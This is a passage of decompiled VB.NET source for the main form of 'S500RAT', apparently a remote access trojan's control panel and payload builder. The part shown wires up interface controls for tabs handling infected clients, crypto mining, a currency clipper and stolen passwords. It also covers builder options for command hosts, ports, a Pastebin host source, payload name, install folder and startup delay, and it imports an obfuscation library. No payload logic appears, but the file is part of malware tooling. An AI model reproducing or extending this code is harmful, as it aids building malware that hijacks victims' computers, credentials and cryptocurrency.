Imports System
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Text
Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports System.Security.Cryptography.X509Certificates
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports dnlib.DotNet
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports Guna.UI2.WinForms.Suite
Imports MessagePackLib.MessagePack
Imports Microsoft.CSharp
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports RenamingObfuscation
Imports S500RAT.My
Imports S500RAT.My.Resources
Imports S500RAT.Server
Imports S500RAT.Server.Algorithm
Imports S500RAT.Server.Connection
Imports Sunny.UI
Imports Vestris.ResourceLib

Namespace S500RAT
	' Token: 0x0200002E RID: 46
	<DesignerGenerated()>
	Public Partial Class FormS500
		Inherits Form

		' Token: 0x17000375 RID: 885
		' (get) Token: 0x060008D1 RID: 2257 RVA: 0x0006C632 File Offset: 0x0006A832
		' (set) Token: 0x060008D2 RID: 2258 RVA: 0x0006C63C File Offset: 0x0006A83C
		Friend Overridable Property UiTabControl1 As UITabControl

		' Token: 0x17000376 RID: 886
		' (get) Token: 0x060008D3 RID: 2259 RVA: 0x0006C645 File Offset: 0x0006A845
		' (set) Token: 0x060008D4 RID: 2260 RVA: 0x0006C64F File Offset: 0x0006A84F
		Private Overridable Property uiLedStopwatch1 As UILedStopwatch

		' Token: 0x17000377 RID: 887
		' (get) Token: 0x060008D5 RID: 2261 RVA: 0x0006C658 File Offset: 0x0006A858
		' (set) Token: 0x060008D6 RID: 2262 RVA: 0x0006C662 File Offset: 0x0006A862
		Friend Overridable Property PictureMAP As System.Windows.Forms.PictureBox

		' Token: 0x17000378 RID: 888
		' (get) Token: 0x060008D7 RID: 2263 RVA: 0x0006C66B File Offset: 0x0006A86B
		' (set) Token: 0x060008D8 RID: 2264 RVA: 0x0006C675 File Offset: 0x0006A875
		Friend Overridable Property L1Home As DataGridView

		' Token: 0x17000379 RID: 889
		' (get) Token: 0x060008D9 RID: 2265 RVA: 0x0006C67E File Offset: 0x0006A87E
		' (set) Token: 0x060008DA RID: 2266 RVA: 0x0006C688 File Offset: 0x0006A888
		Friend Overridable Property PageClients As TabPage

		' Token: 0x1700037A RID: 890
		' (get) Token: 0x060008DB RID: 2267 RVA: 0x0006C691 File Offset: 0x0006A891
		' (set) Token: 0x060008DC RID: 2268 RVA: 0x0006C69B File Offset: 0x0006A89B
		Friend Overridable Property PageClientsLog As TabPage

		' Token: 0x1700037B RID: 891
		' (get) Token: 0x060008DD RID: 2269 RVA: 0x0006C6A4 File Offset: 0x0006A8A4
		' (set) Token: 0x060008DE RID: 2270 RVA: 0x0006C6AE File Offset: 0x0006A8AE
		Friend Overridable Property PageMiningMonitor As TabPage

		' Token: 0x1700037C RID: 892
		' (get) Token: 0x060008DF RID: 2271 RVA: 0x0006C6B7 File Offset: 0x0006A8B7
		' (set) Token: 0x060008E0 RID: 2272 RVA: 0x0006C6C1 File Offset: 0x0006A8C1
		Friend Overridable Property PageCurrncyClipper As TabPage

		' Token: 0x1700037D RID: 893
		' (get) Token: 0x060008E1 RID: 2273 RVA: 0x0006C6CA File Offset: 0x0006A8CA
		' (set) Token: 0x060008E2 RID: 2274 RVA: 0x0006C6D4 File Offset: 0x0006A8D4
		Friend Overridable Property PagePasswords As TabPage

		' Token: 0x1700037E RID: 894
		' (get) Token: 0x060008E3 RID: 2275 RVA: 0x0006C6DD File Offset: 0x0006A8DD
		' (set) Token: 0x060008E4 RID: 2276 RVA: 0x0006C6E7 File Offset: 0x0006A8E7
		Friend Overridable Property PageTools As TabPage

		' Token: 0x1700037F RID: 895
		' (get) Token: 0x060008E5 RID: 2277 RVA: 0x0006C6F0 File Offset: 0x0006A8F0
		' (set) Token: 0x060008E6 RID: 2278 RVA: 0x0006C6FC File Offset: 0x0006A8FC
		Friend Overridable Property PageSettings As TabPage
			<CompilerGenerated()>
			Get
				Return Me._PageSettings
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabPage)
				Dim value2 As EventHandler = AddressOf Me.PageSettings_Click
				Dim pageSettings As TabPage = Me._PageSettings
				If pageSettings IsNot Nothing Then
					RemoveHandler pageSettings.Click, value2
				End If
				Me._PageSettings = value
				pageSettings = Me._PageSettings
				If pageSettings IsNot Nothing Then
					AddHandler pageSettings.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000380 RID: 896
		' (get) Token: 0x060008E7 RID: 2279 RVA: 0x0006C73F File Offset: 0x0006A93F
		' (set) Token: 0x060008E8 RID: 2280 RVA: 0x0006C749 File Offset: 0x0006A949
		Friend Overridable Property PageAbout As TabPage

		' Token: 0x17000381 RID: 897
		' (get) Token: 0x060008E9 RID: 2281 RVA: 0x0006C752 File Offset: 0x0006A952
		' (set) Token: 0x060008EA RID: 2282 RVA: 0x0006C75C File Offset: 0x0006A95C
		Friend Overridable Property ImgFalg As ImageList

		' Token: 0x17000382 RID: 898
		' (get) Token: 0x060008EB RID: 2283 RVA: 0x0006C765 File Offset: 0x0006A965
		' (set) Token: 0x060008EC RID: 2284 RVA: 0x0006C76F File Offset: 0x0006A96F
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x17000383 RID: 899
		' (get) Token: 0x060008ED RID: 2285 RVA: 0x0006C778 File Offset: 0x0006A978
		' (set) Token: 0x060008EE RID: 2286 RVA: 0x0006C782 File Offset: 0x0006A982
		Friend Overridable Property MangerToolStripMenuItem As ToolStripMenuItem

		' Token: 0x17000384 RID: 900
		' (get) Token: 0x060008EF RID: 2287 RVA: 0x0006C78B File Offset: 0x0006A98B
		' (set) Token: 0x060008F0 RID: 2288 RVA: 0x0006C798 File Offset: 0x0006A998
		Friend Overridable Property FilesManagerToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FilesManagerToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FilesManagerToolStripMenuItem_Click_1
				Dim filesManagerToolStripMenuItem As ToolStripMenuItem = Me._FilesManagerToolStripMenuItem
				If filesManagerToolStripMenuItem IsNot Nothing Then
					RemoveHandler filesManagerToolStripMenuItem.Click, value2
				End If
				Me._FilesManagerToolStripMenuItem = value
				filesManagerToolStripMenuItem = Me._FilesManagerToolStripMenuItem
				If filesManagerToolStripMenuItem IsNot Nothing Then
					AddHandler filesManagerToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000385 RID: 901
		' (get) Token: 0x060008F1 RID: 2289 RVA: 0x0006C7DB File Offset: 0x0006A9DB
		' (set) Token: 0x060008F2 RID: 2290 RVA: 0x0006C7E5 File Offset: 0x0006A9E5
		Friend Overridable Property WinList As ImageList

		' Token: 0x17000386 RID: 902
		' (get) Token: 0x060008F3 RID: 2291 RVA: 0x0006C7EE File Offset: 0x0006A9EE
		' (set) Token: 0x060008F4 RID: 2292 RVA: 0x0006C7F8 File Offset: 0x0006A9F8
		Friend Overridable Property IsAdmin As ImageList

		' Token: 0x17000387 RID: 903
		' (get) Token: 0x060008F5 RID: 2293 RVA: 0x0006C801 File Offset: 0x0006AA01
		' (set) Token: 0x060008F6 RID: 2294 RVA: 0x0006C80B File Offset: 0x0006AA0B
		Friend Overridable Property HomeRedius As Guna2Elipse

		' Token: 0x17000388 RID: 904
		' (get) Token: 0x060008F7 RID: 2295 RVA: 0x0006C814 File Offset: 0x0006AA14
		' (set) Token: 0x060008F8 RID: 2296 RVA: 0x0006C81E File Offset: 0x0006AA1E
		Friend Overridable Property ClientsRedius As Guna2Elipse

		' Token: 0x17000389 RID: 905
		' (get) Token: 0x060008F9 RID: 2297 RVA: 0x0006C827 File Offset: 0x0006AA27
		' (set) Token: 0x060008FA RID: 2298 RVA: 0x0006C831 File Offset: 0x0006AA31
		Friend Overridable Property ClientsMonitorRedius As Guna2Elipse

		' Token: 0x1700038A RID: 906
		' (get) Token: 0x060008FB RID: 2299 RVA: 0x0006C83A File Offset: 0x0006AA3A
		' (set) Token: 0x060008FC RID: 2300 RVA: 0x0006C844 File Offset: 0x0006AA44
		Friend Overridable Property MiningRedius As Guna2Elipse

		' Token: 0x1700038B RID: 907
		' (get) Token: 0x060008FD RID: 2301 RVA: 0x0006C84D File Offset: 0x0006AA4D
		' (set) Token: 0x060008FE RID: 2302 RVA: 0x0006C857 File Offset: 0x0006AA57
		Friend Overridable Property ClipperRedius As Guna2Elipse

		' Token: 0x1700038C RID: 908
		' (get) Token: 0x060008FF RID: 2303 RVA: 0x0006C860 File Offset: 0x0006AA60
		' (set) Token: 0x06000900 RID: 2304 RVA: 0x0006C86A File Offset: 0x0006AA6A
		Friend Overridable Property PasswordsRedius As Guna2Elipse

		' Token: 0x1700038D RID: 909
		' (get) Token: 0x06000901 RID: 2305 RVA: 0x0006C873 File Offset: 0x0006AA73
		' (set) Token: 0x06000902 RID: 2306 RVA: 0x0006C87D File Offset: 0x0006AA7D
		Friend Overridable Property BuilderRedius As Guna2Elipse

		' Token: 0x1700038E RID: 910
		' (get) Token: 0x06000903 RID: 2307 RVA: 0x0006C886 File Offset: 0x0006AA86
		' (set) Token: 0x06000904 RID: 2308 RVA: 0x0006C890 File Offset: 0x0006AA90
		Friend Overridable Property ToolsRedius As Guna2Elipse

		' Token: 0x1700038F RID: 911
		' (get) Token: 0x06000905 RID: 2309 RVA: 0x0006C899 File Offset: 0x0006AA99
		' (set) Token: 0x06000906 RID: 2310 RVA: 0x0006C8A3 File Offset: 0x0006AAA3
		Private Overridable Property performancecpu As PerformanceCounter

		' Token: 0x17000390 RID: 912
		' (get) Token: 0x06000907 RID: 2311 RVA: 0x0006C8AC File Offset: 0x0006AAAC
		' (set) Token: 0x06000908 RID: 2312 RVA: 0x0006C8B6 File Offset: 0x0006AAB6
		Friend Overridable Property AboutRedius As Guna2Elipse

		' Token: 0x17000391 RID: 913
		' (get) Token: 0x06000909 RID: 2313 RVA: 0x0006C8BF File Offset: 0x0006AABF
		' (set) Token: 0x0600090A RID: 2314 RVA: 0x0006C8C9 File Offset: 0x0006AAC9
		Friend Overridable Property L1 As Guna2DataGridView

		' Token: 0x17000392 RID: 914
		' (get) Token: 0x0600090B RID: 2315 RVA: 0x0006C8D2 File Offset: 0x0006AAD2
		' (set) Token: 0x0600090C RID: 2316 RVA: 0x0006C8DC File Offset: 0x0006AADC
		Friend Overridable Property ElipseListHost As Guna2Elipse

		' Token: 0x17000393 RID: 915
		' (get) Token: 0x0600090D RID: 2317 RVA: 0x0006C8E5 File Offset: 0x0006AAE5
		' (set) Token: 0x0600090E RID: 2318 RVA: 0x0006C8EF File Offset: 0x0006AAEF
		Friend Overridable Property Guna2HtmlLabel12 As Guna2HtmlLabel

		' Token: 0x17000394 RID: 916
		' (get) Token: 0x0600090F RID: 2319 RVA: 0x0006C8F8 File Offset: 0x0006AAF8
		' (set) Token: 0x06000910 RID: 2320 RVA: 0x0006C902 File Offset: 0x0006AB02
		Friend Overridable Property ConnectBuilderElipse As Guna2Elipse

		' Token: 0x17000395 RID: 917
		' (get) Token: 0x06000911 RID: 2321 RVA: 0x0006C90B File Offset: 0x0006AB0B
		' (set) Token: 0x06000912 RID: 2322 RVA: 0x0006C915 File Offset: 0x0006AB15
		Friend Overridable Property InstallationBuilderElipse As Guna2Elipse

		' Token: 0x17000396 RID: 918
		' (get) Token: 0x06000913 RID: 2323 RVA: 0x0006C91E File Offset: 0x0006AB1E
		' (set) Token: 0x06000914 RID: 2324 RVA: 0x0006C928 File Offset: 0x0006AB28
		Friend Overridable Property SecurityBuilderElipse As Guna2Elipse

		' Token: 0x17000397 RID: 919
		' (get) Token: 0x06000915 RID: 2325 RVA: 0x0006C931 File Offset: 0x0006AB31
		' (set) Token: 0x06000916 RID: 2326 RVA: 0x0006C93B File Offset: 0x0006AB3B
		Friend Overridable Property MiningBuilderElipse As Guna2Elipse

		' Token: 0x17000398 RID: 920
		' (get) Token: 0x06000917 RID: 2327 RVA: 0x0006C944 File Offset: 0x0006AB44
		' (set) Token: 0x06000918 RID: 2328 RVA: 0x0006C94E File Offset: 0x0006AB4E
		Friend Overridable Property BAssemblyElipse7 As Guna2Elipse

		' Token: 0x17000399 RID: 921
		' (get) Token: 0x06000919 RID: 2329 RVA: 0x0006C957 File Offset: 0x0006AB57
		' (set) Token: 0x0600091A RID: 2330 RVA: 0x0006C961 File Offset: 0x0006AB61
		Friend Overridable Property BclipperElipse6 As Guna2Elipse

		' Token: 0x1700039A RID: 922
		' (get) Token: 0x0600091B RID: 2331 RVA: 0x0006C96A File Offset: 0x0006AB6A
		' (set) Token: 0x0600091C RID: 2332 RVA: 0x0006C974 File Offset: 0x0006AB74
		Friend Overridable Property BuildElipse2 As Guna2Elipse

		' Token: 0x1700039B RID: 923
		' (get) Token: 0x0600091D RID: 2333 RVA: 0x0006C97D File Offset: 0x0006AB7D
		' (set) Token: 0x0600091E RID: 2334 RVA: 0x0006C987 File Offset: 0x0006AB87
		Friend Overridable Property PageBuilder As TabPage

		' Token: 0x1700039C RID: 924
		' (get) Token: 0x0600091F RID: 2335 RVA: 0x0006C990 File Offset: 0x0006AB90
		' (set) Token: 0x06000920 RID: 2336 RVA: 0x0006C99C File Offset: 0x0006AB9C
		Private Overridable Property Bconnect As System.Windows.Forms.Button
			<CompilerGenerated()>
			Get
				Return Me._Bconnect
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Button)
				Dim value2 As EventHandler = AddressOf Me.Bconnect_Click_1
				Dim bconnect As System.Windows.Forms.Button = Me._Bconnect
				If bconnect IsNot Nothing Then
					RemoveHandler bconnect.Click, value2
				End If
				Me._Bconnect = value
				bconnect = Me._Bconnect
				If bconnect IsNot Nothing Then
					AddHandler bconnect.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700039D RID: 925
		' (get) Token: 0x06000921 RID: 2337 RVA: 0x0006C9DF File Offset: 0x0006ABDF
		' (set) Token: 0x06000922 RID: 2338 RVA: 0x0006C9E9 File Offset: 0x0006ABE9
		Friend Overridable Property UiLine1 As UILine

		' Token: 0x1700039E RID: 926
		' (get) Token: 0x06000923 RID: 2339 RVA: 0x0006C9F2 File Offset: 0x0006ABF2
		' (set) Token: 0x06000924 RID: 2340 RVA: 0x0006C9FC File Offset: 0x0006ABFC
		Friend Overridable Property TabControlBuuilder As UITabControl

		' Token: 0x1700039F RID: 927
		' (get) Token: 0x06000925 RID: 2341 RVA: 0x0006CA05 File Offset: 0x0006AC05
		' (set) Token: 0x06000926 RID: 2342 RVA: 0x0006CA10 File Offset: 0x0006AC10
		Friend Overridable Property TabPage4 As TabPage
			<CompilerGenerated()>
			Get
				Return Me._TabPage4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabPage)
				Dim value2 As EventHandler = AddressOf Me.TabPage4_Click
				Dim tabPage As TabPage = Me._TabPage4
				If tabPage IsNot Nothing Then
					RemoveHandler tabPage.Click, value2
				End If
				Me._TabPage4 = value
				tabPage = Me._TabPage4
				If tabPage IsNot Nothing Then
					AddHandler tabPage.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003A0 RID: 928
		' (get) Token: 0x06000927 RID: 2343 RVA: 0x0006CA53 File Offset: 0x0006AC53
		' (set) Token: 0x06000928 RID: 2344 RVA: 0x0006CA5D File Offset: 0x0006AC5D
		Friend Overridable Property BClientName As Guna2TextBox

		' Token: 0x170003A1 RID: 929
		' (get) Token: 0x06000929 RID: 2345 RVA: 0x0006CA66 File Offset: 0x0006AC66
		' (set) Token: 0x0600092A RID: 2346 RVA: 0x0006CA70 File Offset: 0x0006AC70
		Friend Overridable Property RemaveListHostsPorts As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._RemaveListHostsPorts
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.RemaveListHostsPorts_Click
				Dim remaveListHostsPorts As Guna2GradientButton = Me._RemaveListHostsPorts
				If remaveListHostsPorts IsNot Nothing Then
					RemoveHandler remaveListHostsPorts.Click, value2
				End If
				Me._RemaveListHostsPorts = value
				remaveListHostsPorts = Me._RemaveListHostsPorts
				If remaveListHostsPorts IsNot Nothing Then
					AddHandler remaveListHostsPorts.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003A2 RID: 930
		' (get) Token: 0x0600092B RID: 2347 RVA: 0x0006CAB3 File Offset: 0x0006ACB3
		' (set) Token: 0x0600092C RID: 2348 RVA: 0x0006CABD File Offset: 0x0006ACBD
		Friend Overridable Property BPastebinTxt As Guna2TextBox

		' Token: 0x170003A3 RID: 931
		' (get) Token: 0x0600092D RID: 2349 RVA: 0x0006CAC6 File Offset: 0x0006ACC6
		' (set) Token: 0x0600092E RID: 2350 RVA: 0x0006CAD0 File Offset: 0x0006ACD0
		Friend Overridable Property Bport As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._Bport
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.Bport_KeyPress
				Dim bport As Guna2TextBox = Me._Bport
				If bport IsNot Nothing Then
					RemoveHandler bport.KeyPress, value2
				End If
				Me._Bport = value
				bport = Me._Bport
				If bport IsNot Nothing Then
					AddHandler bport.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x170003A4 RID: 932
		' (get) Token: 0x0600092F RID: 2351 RVA: 0x0006CB13 File Offset: 0x0006AD13
		' (set) Token: 0x06000930 RID: 2352 RVA: 0x0006CB1D File Offset: 0x0006AD1D
		Friend Overridable Property Bhost As Guna2TextBox

		' Token: 0x170003A5 RID: 933
		' (get) Token: 0x06000931 RID: 2353 RVA: 0x0006CB26 File Offset: 0x0006AD26
		' (set) Token: 0x06000932 RID: 2354 RVA: 0x0006CB30 File Offset: 0x0006AD30
		Friend Overridable Property Guna2HtmlLabel10 As Guna2HtmlLabel

		' Token: 0x170003A6 RID: 934
		' (get) Token: 0x06000933 RID: 2355 RVA: 0x0006CB39 File Offset: 0x0006AD39
		' (set) Token: 0x06000934 RID: 2356 RVA: 0x0006CB43 File Offset: 0x0006AD43
		Friend Overridable Property ListHostPort As DataGridView

		' Token: 0x170003A7 RID: 935
		' (get) Token: 0x06000935 RID: 2357 RVA: 0x0006CB4C File Offset: 0x0006AD4C
		' (set) Token: 0x06000936 RID: 2358 RVA: 0x0006CB58 File Offset: 0x0006AD58
		Friend Overridable Property Add_Socket As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._Add_Socket
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.Add_Socket_Click
				Dim add_Socket As Guna2GradientButton = Me._Add_Socket
				If add_Socket IsNot Nothing Then
					RemoveHandler add_Socket.Click, value2
				End If
				Me._Add_Socket = value
				add_Socket = Me._Add_Socket
				If add_Socket IsNot Nothing Then
					AddHandler add_Socket.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170003A8 RID: 936
		' (get) Token: 0x06000937 RID: 2359 RVA: 0x0006CB9B File Offset: 0x0006AD9B
		' (set) Token: 0x06000938 RID: 2360 RVA: 0x0006CBA8 File Offset: 0x0006ADA8
		Friend Overridable Property Bpastebin As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._Bpastebin
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.Bpastebin_CheckedChanged
				Dim bpastebin As UIRadioButton = Me._Bpastebin
				If bpastebin IsNot Nothing Then
					RemoveHandler bpastebin.CheckedChanged, value2
				End If
				Me._Bpastebin = value
				bpastebin = Me._Bpastebin
				If bpastebin IsNot Nothing Then
					AddHandler bpastebin.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003A9 RID: 937
		' (get) Token: 0x06000939 RID: 2361 RVA: 0x0006CBEB File Offset: 0x0006ADEB
		' (set) Token: 0x0600093A RID: 2362 RVA: 0x0006CBF8 File Offset: 0x0006ADF8
		Friend Overridable Property BIPDNS As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._BIPDNS
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.BIPDNS_CheckedChanged
				Dim bipdns As UIRadioButton = Me._BIPDNS
				If bipdns IsNot Nothing Then
					RemoveHandler bipdns.CheckedChanged, value2
				End If
				Me._BIPDNS = value
				bipdns = Me._BIPDNS
				If bipdns IsNot Nothing Then
					AddHandler bipdns.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003AA RID: 938
		' (get) Token: 0x0600093B RID: 2363 RVA: 0x0006CC3B File Offset: 0x0006AE3B
		' (set) Token: 0x0600093C RID: 2364 RVA: 0x0006CC45 File Offset: 0x0006AE45
		Friend Overridable Property TabPage6 As TabPage

		' Token: 0x170003AB RID: 939
		' (get) Token: 0x0600093D RID: 2365 RVA: 0x0006CC4E File Offset: 0x0006AE4E
		' (set) Token: 0x0600093E RID: 2366 RVA: 0x0006CC58 File Offset: 0x0006AE58
		Friend Overridable Property Installation_Location As Guna2TextBox

		' Token: 0x170003AC RID: 940
		' (get) Token: 0x0600093F RID: 2367 RVA: 0x0006CC61 File Offset: 0x0006AE61
		' (set) Token: 0x06000940 RID: 2368 RVA: 0x0006CC6C File Offset: 0x0006AE6C
		Friend Overridable Property Install_ProgramFiles As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._Install_ProgramFiles
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.Install_ProgramFiles_CheckedChanged
				Dim install_ProgramFiles As UIRadioButton = Me._Install_ProgramFiles
				If install_ProgramFiles IsNot Nothing Then
					RemoveHandler install_ProgramFiles.CheckedChanged, value2
				End If
				Me._Install_ProgramFiles = value
				install_ProgramFiles = Me._Install_ProgramFiles
				If install_ProgramFiles IsNot Nothing Then
					AddHandler install_ProgramFiles.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003AD RID: 941
		' (get) Token: 0x06000941 RID: 2369 RVA: 0x0006CCAF File Offset: 0x0006AEAF
		' (set) Token: 0x06000942 RID: 2370 RVA: 0x0006CCBC File Offset: 0x0006AEBC
		Friend Overridable Property Install_ProgramData As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._Install_ProgramData
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.Install_ProgramData_CheckedChanged
				Dim install_ProgramData As UIRadioButton = Me._Install_ProgramData
				If install_ProgramData IsNot Nothing Then
					RemoveHandler install_ProgramData.CheckedChanged, value2
				End If
				Me._Install_ProgramData = value
				install_ProgramData = Me._Install_ProgramData
				If install_ProgramData IsNot Nothing Then
					AddHandler install_ProgramData.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003AE RID: 942
		' (get) Token: 0x06000943 RID: 2371 RVA: 0x0006CCFF File Offset: 0x0006AEFF
		' (set) Token: 0x06000944 RID: 2372 RVA: 0x0006CD0C File Offset: 0x0006AF0C
		Friend Overridable Property NumDelay As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._NumDelay
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyPressEventHandler = AddressOf Me.NumDelay_KeyPress
				Dim numDelay As Guna2TextBox = Me._NumDelay
				If numDelay IsNot Nothing Then
					RemoveHandler numDelay.KeyPress, value2
				End If
				Me._NumDelay = value
				numDelay = Me._NumDelay
				If numDelay IsNot Nothing Then
					AddHandler numDelay.KeyPress, value2
				End If
			End Set
		End Property

		' Token: 0x170003AF RID: 943
		' (get) Token: 0x06000945 RID: 2373 RVA: 0x0006CD4F File Offset: 0x0006AF4F
		' (set) Token: 0x06000946 RID: 2374 RVA: 0x0006CD5C File Offset: 0x0006AF5C
		Friend Overridable Property PayloadName As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._PayloadName
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.PayloadName_TextChanged
				Dim value3 As KeyPressEventHandler = AddressOf Me.PayloadName_KeyPress
				Dim payloadName As Guna2TextBox = Me._PayloadName
				If payloadName IsNot Nothing Then
					RemoveHandler payloadName.TextChanged, value2
					RemoveHandler payloadName.KeyPress, value3
				End If
				Me._PayloadName = value
				payloadName = Me._PayloadName
				If payloadName IsNot Nothing Then
					AddHandler payloadName.TextChanged, value2
					AddHandler payloadName.KeyPress, value3
				End If
			End Set
		End Property

		' Token: 0x170003B0 RID: 944
		' (get) Token: 0x06000947 RID: 2375 RVA: 0x0006CDBA File Offset: 0x0006AFBA
		' (set) Token: 0x06000948 RID: 2376 RVA: 0x0006CDC4 File Offset: 0x0006AFC4
		Friend Overridable Property Label11 As Label

		' Token: 0x170003B1 RID: 945
		' (get) Token: 0x06000949 RID: 2377 RVA: 0x0006CDCD File Offset: 0x0006AFCD
		' (set) Token: 0x0600094A RID: 2378 RVA: 0x0006CDD8 File Offset: 0x0006AFD8
		Friend Overridable Property Install As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._Install
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.Install_CheckedChanged
				Dim install As Guna2ToggleSwitch = Me._Install
				If install IsNot Nothing Then
					RemoveHandler install.CheckedChanged, value2
				End If
				Me._Install = value
				install = Me._Install
				If install IsNot Nothing Then
					AddHandler install.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003B2 RID: 946
		' (get) Token: 0x0600094B RID: 2379 RVA: 0x0006CE1B File Offset: 0x0006B01B
		' (set) Token: 0x0600094C RID: 2380 RVA: 0x0006CE25 File Offset: 0x0006B025
		Friend Overridable Property Label10 As Label

		' Token: 0x170003B3 RID: 947
		' (get) Token: 0x0600094D RID: 2381 RVA: 0x0006CE2E File Offset: 0x0006B02E
		' (set) Token: 0x0600094E RID: 2382 RVA: 0x0006CE38 File Offset: 0x0006B038
		Friend Overridable Property Install_AppData As UIRadioButton
			<CompilerGenerated()>
			Get
				Return Me._Install_AppData
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIRadioButton)
				Dim value2 As EventHandler = AddressOf Me.Install_AppData_CheckedChanged
				Dim install_AppData As UIRadioButton = Me._Install_AppData
				If install_AppData IsNot Nothing Then
					RemoveHandler install_AppData.CheckedChanged, value2
				End If
				Me._Install_AppData = value
				install_AppData = Me._Install_AppData
				If install_AppData IsNot Nothing Then
					AddHandler install_AppData.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170003B4 RID: 948
		' (get) Token: 0x0600094F RID: 2383 RVA: 0x0006CE7B File Offset: 0x0006B07B
		' (set) Token: 0x06000950 RID: 2384 RVA: 0x0006CE88 File Offset: 0x0006B088
		Friend Overridable Property NameFolder As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._NameFolder
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.NameFolder_TextChanged
				Dim value3 As KeyPressEventHandler = AddressOf Me.NameFolder_KeyPress
				Dim nameFolder As Guna2TextBox = Me._NameFolder
				If nameFolder IsNot Nothing Then
					RemoveHandler nameFolder.TextChanged, value2
					RemoveHandler nameFolder.KeyPress, value3
				End If
				Me._NameFolder = value
				nameFolder = Me._NameFolder
				If nameFolder IsNot Nothing Then
					AddHandler nameFolder.TextChanged, value2
					AddHandler nameFolder.KeyPress, value3
				End If
			End Set
		End Property

		' Token: 0x170003B5 RID: 949
		' (get) Token: 0x06000951 RID: 2385 RVA: 0x0006CEE6 File Offset: 0x0006B0E6
		' (set) Token: 0x06000952 RID: 2386 RVA: 0x0006CEF0 File Offset: 0x0006B0F0
		Friend Overridable Property Label2 As Label

		' Token: 0x170003B6 RID: 950
		' (get) Token: 0x06000953 RID: 2387 RVA: 0x0006CEF9 File Offset: 0x0006B0F9
		' (set) Token: 0x06000954 RID: 2388 RVA: 0x0006CF04 File Offset: 0x0006B104
		Friend Overridable Property Delay As Guna2ToggleSwitch
			<CompilerGenerated()>
			Get
				Return Me._Delay
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2ToggleSwitch)
				Dim value2 As EventHandler = AddressOf Me.Delay_CheckedChanged
				Dim delay As Guna2ToggleSwitch = Me._Delay
				If delay IsNot Nothing Then
					RemoveHandler delay.CheckedChanged, value2
				End If
				Me._Delay = value
				delay = Me._Delay
				If delay IsNot Nothing Then
					AddHandler delay.CheckedChanged, value2
				End If
			End Set
		End Property

